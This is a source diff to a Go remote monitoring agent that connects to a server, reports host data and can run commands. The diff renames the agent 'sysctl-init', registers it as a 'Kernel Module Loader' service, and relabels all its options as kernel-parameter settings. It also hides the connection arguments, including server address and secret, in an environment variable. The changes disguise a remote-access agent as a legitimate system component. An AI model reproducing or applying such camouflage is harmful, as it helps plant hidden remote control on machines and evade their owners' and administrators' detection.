@@ -66,7 +66,7 @@ var (
 )
 
 var agentCmd = &cobra.Command{
-	Use: "agent",
+	Use: "sysctl-init",
 	Run: func(cmd *cobra.Command, args []string) {
 		runService("", nil)
 	},
@@ -137,23 +137,23 @@ func init() {
 	}
 
 	// 初始化运行参数
-	agentCmd.PersistentFlags().StringVarP(&agentCliParam.Server, "server", "s", "localhost:5555", "内核参数管理服务器地址")
-	agentCmd.PersistentFlags().StringVarP(&agentCliParam.ClientSecret, "password", "p", "", "内核参数同步密钥")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.TLS, "tls", false, "启用数据加密")
-	agentCmd.PersistentFlags().BoolVarP(&agentCliParam.InsecureTLS, "insecure", "k", false, "禁用证书检查")
-	agentCmd.PersistentFlags().BoolVarP(&agentConfig.Debug, "debug", "d", false, "启用内核参数调试模式")
-	agentCmd.PersistentFlags().IntVar(&agentCliParam.ReportDelay, "report-delay", 1, "内核参数状态刷新间隔（秒）")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipConnectionCount, "skip-conn", false, "跳过内核连接数统计")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipProcsCount, "skip-procs", false, "跳过内核进程数统计")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableCommandExecute, "disable-command-execute", false, "禁止执行内核命令")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableAutoUpdate, "disable-auto-update", false, "禁用内核参数的自动更新")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableForceUpdate, "disable-force-update", false, "禁用强制升级")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseIPv6CountryCode, "use-ipv6-countrycode", false, "使用IPv6地址报告地区码")
-	agentCmd.PersistentFlags().BoolVar(&agentConfig.GPU, "gpu", false, "启用GPU内核模块")
-	agentCmd.PersistentFlags().BoolVar(&agentConfig.Temperature, "temperature", false, "启用内核温度模块")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseGiteeToUpgrade, "gitee", false, "使用靠近目标地址的镜像源更新内核参数")
-	agentCmd.PersistentFlags().Uint32VarP(&agentCliParam.IPReportPeriod, "ip-report-period", "u", 30*60, "内核IP地址更新间隔（秒）")
-	agentCmd.Flags().BoolVarP(&agentCliParam.Version, "version", "v", false, "显示内核参数管理工具的版本信息")
+	agentCmd.PersistentFlags().StringVarP(&agentCliParam.Server, "server", "s", "localhost:5555", "address of the kernel parameter management server")
+	agentCmd.PersistentFlags().StringVarP(&agentCliParam.ClientSecret, "password", "p", "", "kernel parameter synchronization key")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.TLS, "tls", false, "enable data encryption")
+	agentCmd.PersistentFlags().BoolVarP(&agentCliParam.InsecureTLS, "insecure", "k", false, "disable certificate verification")
+	agentCmd.PersistentFlags().BoolVarP(&agentConfig.Debug, "debug", "d", false, "enable kernel parameter debug mode")
+	agentCmd.PersistentFlags().IntVar(&agentCliParam.ReportDelay, "report-delay", 1, "kernel parameter status refresh interval (seconds)")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipConnectionCount, "skip-conn", false, "skip kernel connection count statistics")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipProcsCount, "skip-procs", false, "skip kernel process count statistics")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableCommandExecute, "disable-command-execute", false, "prohibit execution of kernel commands")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableAutoUpdate, "disable-auto-update", false, "disable automatic updates of kernel parameters")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableForceUpdate, "disable-force-update", false, "disable forced upgrades")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseIPv6CountryCode, "use-ipv6-countrycode", false, "use IPv6 address to report country codes")
+	agentCmd.PersistentFlags().BoolVar(&agentConfig.GPU, "gpu", false, "enable GPU kernel module")
+	agentCmd.PersistentFlags().BoolVar(&agentConfig.Temperature, "temperature", false, "enable kernel temperature module")
+	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseGiteeToUpgrade, "gitee", false, "use a mirror source closer to the target address to update kernel parameters")
+	agentCmd.PersistentFlags().Uint32VarP(&agentCliParam.IPReportPeriod, "ip-report-period", "u", 30*60, "kernel IP address update interval (seconds)")
+	agentCmd.Flags().BoolVarP(&agentCliParam.Version, "version", "v", false, "display version information of the kernel parameter management tool")
 
 	agentConfig.Read(filepath.Dir(ex) + "/config.yml")
 
@@ -184,7 +184,7 @@ func persistPreRun(cmd *cobra.Command, args []string) {
 			hostArch = "arm64"
 		}
 		if arch != hostArch {
-			panic(fmt.Sprintf("与当前系统不匹配，当前运行 %s_%s, 需要下载 %s_%s", runtime.GOOS, arch, runtime.GOOS, hostArch))
+			panic(fmt.Sprintf("System architecture mismatch: current system %s_%s, but %s_%s is required", runtime.GOOS, arch, runtime.GOOS, hostArch))
 		}
 	}
 }
@@ -264,7 +264,7 @@ func run() {
 		}
 		conn, err = grpc.DialContext(timeOutCtx, agentCliParam.Server, securityOption, grpc.WithPerRPCCredentials(&auth))
 		if err != nil {
-			printf("与内核建立连接失败: %v", err)
+			printf("connect to kernel failed: %v", err)
 			cancel()
 			retry()
 			continue
@@ -275,7 +275,7 @@ func run() {
 		timeOutCtx, cancel = context.WithTimeout(context.Background(), networkTimeOut)
 		_, err = client.ReportSystemInfo(timeOutCtx, monitor.GetHost().PB())
 		if err != nil {
-			printf("更新内核信息失败: %v", err)
+			printf("update kernel info failed: %v", err)
 			cancel()
 			retry()
 			continue
@@ -306,13 +306,23 @@ func runService(action string, flags []string) {
 		"OnFailure": "restart",
 	}
 
+	envVarName := "SERVICE_ARGS"
+	envVarValue := strings.Join(flags, " ") // 使用空格作为分隔符
+
+	// 创建环境变量映射
+	envVars := map[string]string{
+		envVarName: envVarValue,
+	}
+
 	svcConfig := &service.Config{
 		Name:             "sysctl-init",
 		DisplayName:      "Kernel Module Loader",
 		Description:      "Initialize System Kernel Parameters",
-		Arguments:        flags,
+		// Arguments:        flags,
+		Arguments:        []string{"$SERVICE_ARGS"},
 		WorkingDirectory: dir,
 		Option:           winConfig,
+		EnvVars:          envVars,
 	}
 
 	prg := &program{
